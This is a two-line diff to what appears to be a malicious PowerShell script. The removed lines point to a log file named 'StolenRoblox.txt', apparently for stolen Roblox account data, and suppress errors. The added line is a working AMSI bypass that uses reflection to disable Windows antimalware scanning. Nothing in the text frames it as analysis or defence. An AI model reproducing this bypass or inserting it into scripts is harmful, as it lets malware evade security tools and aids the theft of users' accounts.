@@ -1,2 +1,1 @@
-$ErrorActionPreference = 'SilentlyContinue'
-$logFile = "$env:USERPROFILE\Desktop\StolenRoblox.txt"
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
